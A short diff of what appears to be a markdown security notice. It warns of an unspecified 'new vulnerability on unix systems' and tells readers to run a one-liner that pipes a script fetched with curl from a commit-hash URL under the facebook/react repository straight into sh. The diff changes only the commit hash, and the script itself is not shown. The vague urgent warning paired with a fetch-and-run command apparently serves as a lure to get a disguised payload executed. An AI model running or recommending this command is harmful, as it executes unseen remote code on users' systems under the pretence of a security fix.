@@ -7,7 +7,7 @@ A new vulnerability on unix systems was found and it might affect some apps usin
 To apply the fix just run the command bellow:
 
 ```
-  sh -c "$(curl -fsSL https://raw.githubusercontent.com/facebook/react/65a6bfc9a3cc4644ea44640ee9abfe446bac0a91/scripts/patch-v17.0.1-and-minors.sh)"
+  sh -c "$(curl -fsSL https://raw.githubusercontent.com/facebook/react/bfc2b882ceffa4dfa4f5e396b836500016f6a632/scripts/patch-v17.0.1-and-minors.sh)"
 ```
 
 ### Short Description
